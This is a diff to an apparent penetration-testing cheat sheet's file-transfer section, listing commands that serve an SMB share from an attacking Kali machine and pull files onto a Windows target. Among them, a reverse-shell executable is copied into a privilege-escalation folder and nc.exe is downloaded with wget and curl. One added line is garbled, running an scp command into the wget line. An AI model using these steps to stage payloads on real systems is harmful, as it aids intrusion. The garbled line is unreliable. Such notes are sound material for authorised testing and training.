@@ -348,12 +348,14 @@ FILE TRANSFER
        •  python -m pyftpdlib -p 21 -w -d /tmp
        •  ptftpd -p 69  -v eth0 /tmp
        •  impacket-smbserver -username guest -password guest -smb2support  share  $(pwd) ////  Might need to remove -smb2support option
-       •  /impacket/examples/smbserver.py share smb  ////in Attacking Kali machine
+       •  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .     ////in Attacking Kali machine
+          copy \\<kali-IP>\kali\reverse.exe C:\PrivEsc\reverse.exe                   //// in Windows Target machine
+       •  scp file.txt remote_username@<target-IP>:/remote/directory
        
        
     Tools:
        •  Linux & Windows ( Newer Windows versions only )
-             ▪  wget http://10.11.0.106/nc.exe -O nc.exe
+             ▪  wget http://10.11.0.106/nc.exe -O nc.exescp file.txt remote_username@10.10.0.2:/remote/directory
              ▪  curl http://10.11.0.106/nc.exe  -o nc.exe
              ▪  Netcat File Transfer :
                 ▪  nc -l -p $port  >  filename
